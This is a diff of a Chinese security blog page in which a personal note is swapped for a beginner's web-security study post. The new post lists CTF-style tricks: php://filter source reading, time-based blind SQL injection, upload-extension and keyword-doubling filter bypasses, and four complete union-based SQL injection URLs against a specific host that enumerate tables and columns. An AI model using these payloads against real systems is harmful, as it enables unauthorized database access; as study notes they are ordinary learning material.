@@ -7,7 +7,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>离职小记 | foyjog</title>
+  <title>初学web安全记录 | foyjog</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -15,17 +15,17 @@
     <meta name="keywords" content="二进制,破解,内核安全" />
   
 
-  <meta name="description" content="小记从9月份开始就一直没有怎么写过博客啦，一方面在不停的找工作，一方面在360实习，做的模糊测试方向的工作，想要写点儿啥吧，也写不太出来，一直在分析一些so文件和找hikey内核的漏洞，确实没啥博客可做，但是实习的时候能力肯定是不停的再提高的。之前一直想去绿盟工作打比赛，感觉上会很有意思，但是最后还是选择了回深圳工作，但无论每条路怎么选择，都有其不同的感受吧，做到现在大概是做了一年左右的安全了，实">
+  <meta name="description" content="前言不知为啥突然想要学web安全了，之前一直没有学，感觉从事安全行业一些基本的web安全还是要懂一些，所以慢学慢记录吧。 php://input和php://filter php://filter/read=convert.base64-encode/resource=hint.php file_get_contents(“php://input”) ,”php://input”可以为post的数">
 <meta property="og:type" content="article">
-<meta property="og:title" content="离职小记">
-<meta property="og:url" content="https://foyjog.github.io/2018/12/02/离职小记/index.html">
+<meta property="og:title" content="初学web安全记录">
+<meta property="og:url" content="https://foyjog.github.io/2018/12/28/初学web安全记录/index.html">
 <meta property="og:site_name" content="foyjog">
-<meta property="og:description" content="小记从9月份开始就一直没有怎么写过博客啦，一方面在不停的找工作，一方面在360实习，做的模糊测试方向的工作，想要写点儿啥吧，也写不太出来，一直在分析一些so文件和找hikey内核的漏洞，确实没啥博客可做，但是实习的时候能力肯定是不停的再提高的。之前一直想去绿盟工作打比赛，感觉上会很有意思，但是最后还是选择了回深圳工作，但无论每条路怎么选择，都有其不同的感受吧，做到现在大概是做了一年左右的安全了，实">
+<meta property="og:description" content="前言不知为啥突然想要学web安全了，之前一直没有学，感觉从事安全行业一些基本的web安全还是要懂一些，所以慢学慢记录吧。 php://input和php://filter php://filter/read=convert.base64-encode/resource=hint.php file_get_contents(“php://input”) ,”php://input”可以为post的数">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-12-02T15:20:13.678Z">
+<meta property="og:updated_time" content="2018-12-29T12:04:23.506Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="离职小记">
-<meta name="twitter:description" content="小记从9月份开始就一直没有怎么写过博客啦，一方面在不停的找工作，一方面在360实习，做的模糊测试方向的工作，想要写点儿啥吧，也写不太出来，一直在分析一些so文件和找hikey内核的漏洞，确实没啥博客可做，但是实习的时候能力肯定是不停的再提高的。之前一直想去绿盟工作打比赛，感觉上会很有意思，但是最后还是选择了回深圳工作，但无论每条路怎么选择，都有其不同的感受吧，做到现在大概是做了一年左右的安全了，实">
+<meta name="twitter:title" content="初学web安全记录">
+<meta name="twitter:description" content="前言不知为啥突然想要学web安全了，之前一直没有学，感觉从事安全行业一些基本的web安全还是要懂一些，所以慢学慢记录吧。 php://input和php://filter php://filter/read=convert.base64-encode/resource=hint.php file_get_contents(“php://input”) ,”php://input”可以为post的数">
 
   
 
@@ -184,20 +184,20 @@
 
   <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#小记"><span class="toc-text">小记</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input和php-filter"><span class="toc-text">php://input和php://filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一些字段"><span class="toc-text">一些字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于时间的盲注"><span class="toc-text">基于时间的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一些绕过"><span class="toc-text">一些绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常见源码泄露"><span class="toc-text">常见源码泄露</span></a></li></ol>
   </div>
 
 
 
 <div class="content content-post CENTER">
-   <article id="post-离职小记" class="article article-type-post" itemprop="blogPost">
+   <article id="post-初学web安全记录" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">离职小记</h1>
+    <h1 class="post-title">初学web安全记录</h1>
 
     <div class="article-meta">
       <span>
         <i class="icon-calendar"></i>
-        <span>2018.12.02</span>
+        <span>2018.12.28</span>
       </span>
 
       
@@ -225,7 +225,23 @@
 
   <div class="article-content">
     
-      <h3 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h3><p>从9月份开始就一直没有怎么写过博客啦，一方面在不停的找工作，一方面在360实习，做的模糊测试方向的工作，想要写点儿啥吧，也写不太出来，一直在分析一些so文件和找hikey内核的漏洞，确实没啥博客可做，但是实习的时候能力肯定是不停的再提高的。之前一直想去绿盟工作打比赛，感觉上会很有意思，但是最后还是选择了回深圳工作，但无论每条路怎么选择，都有其不同的感受吧，做到现在大概是做了一年左右的安全了，实际应该是6月份在腾讯实习开始系统学习安全知识的，之前都是靠一些兴趣偶尔学习一点，打打小众的ctf提高一下自己，但不得不说，做安全的感觉确实比开发要好，你会有很多未知的东西想要去学习，就会有干劲。希望在做安全的方向坚持下去，好好的做出一些东西吧。</p>
+      <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知为啥突然想要学web安全了，之前一直没有学，感觉从事安全行业一些基本的web安全还是要懂一些，所以慢学慢记录吧。</p>
+<h3 id="php-input和php-filter"><a href="#php-input和php-filter" class="headerlink" title="php://input和php://filter"></a>php://input和php://filter</h3><ol>
+<li>php://filter/read=convert.base64-encode/resource=hint.php</li>
+<li>file_get_contents(“php://input”) ,”php://input”可以为post的数据</li>
+</ol>
+<h3 id="一些字段"><a href="#一些字段" class="headerlink" title="一些字段"></a>一些字段</h3><ol>
+<li>X-Forwarded-For</li>
+<li>referer<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3></li>
+<li>if(exp1,exp2,epx3)</li>
+<li>case when exp1 then sleep(4) else 1 end<h3 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h3></li>
+<li>php别名：php2, php3, php4, php5, phps, pht, phtm, phtml</li>
+<li>http头中的Content-type的值大小写可以绕过。</li>
+<li>双字绕过，如and为aandnd，or为oorr，uniunionon，selecselectt </li>
+<li>爆表名和字段之类<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,database()%23</span><br><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20table_name%20from%20infoorrmation_schema.tables%20where%20table_schema=database()%20limit%200,1)%23</span><br><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20column_name%20from%20infoorrmation_schema.columns%20where%20table_schema=database()%20anandd%20table_name=%27flag1%27%20limit%200,1)%23</span><br><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1%27uniunionon%20selselectect%201,(selecselectt%20column_name%20from%20infoorrmation_schema.columns%20where%20table_schema=database()%20anandd%20table_name=%27flag1%27%20limit%201,1)%23</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="常见源码泄露"><a href="#常见源码泄露" class="headerlink" title="常见源码泄露"></a>常见源码泄露</h3><p><a href="https://www.secpulse.com/archives/55286.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/55286.html</a></p>
 
     
   </div>
@@ -237,10 +253,10 @@
 
    
   <div class="box-prev-next clearfix">
-    <a class="show pull-left" href="/2018/09/20/CVE-2012-0158的分析与利用/">
+    <a class="show pull-left" href="/2018/12/02/离职小记/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2018/12/28/初学web安全记录/">
+    <a class="show pull-right" href="/2019/01/10/CVE-2012-1876分析记录/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
